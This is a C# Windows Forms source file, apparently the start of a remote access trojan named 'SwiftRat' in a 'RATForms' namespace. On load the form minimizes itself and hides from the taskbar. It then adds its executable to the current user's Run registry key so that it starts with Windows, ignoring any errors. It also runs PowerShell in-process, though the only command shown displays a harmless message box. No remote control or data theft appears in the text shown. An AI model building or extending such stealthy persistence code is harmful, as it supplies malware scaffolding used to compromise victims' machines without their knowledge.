using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Management.Automation;
using System.Runtime.InteropServices;

namespace RATForms
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }


        private void Form1_Load(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
            FormBorderStyle = FormBorderStyle.SizableToolWindow;
            ShowInTaskbar = false;
            AddApplicationToStartup();

            ExecutePowershell("PowerShell -Command \"Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('Hello World')\"\r\n");
        }


        private void ExecutePowershell(string command)
        {
            PowerShell ps = PowerShell.Create();
            string script = string.Format(command);
            ps.AddScript(script);
            ps.Invoke();
        }


        public static void AddApplicationToStartup()
        {
            string exePath = Application.ExecutablePath;
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            if (registryKey != null)
            {
                try
                {
                    object value = registryKey.GetValue("SwiftRat");
                    if (value == null || !value.ToString().Equals(exePath, StringComparison.OrdinalIgnoreCase))
                    {
                        registryKey.SetValue("SwiftRat", exePath);

                    }
                }
                catch (Exception ex)
                {

                }
                finally
                {
                    registryKey.Close();
                }
            }
        }

        private void Closing(object sender, FormClosingEventArgs e)
        {
            MessageBox.Show("lol");
        }
    }
}
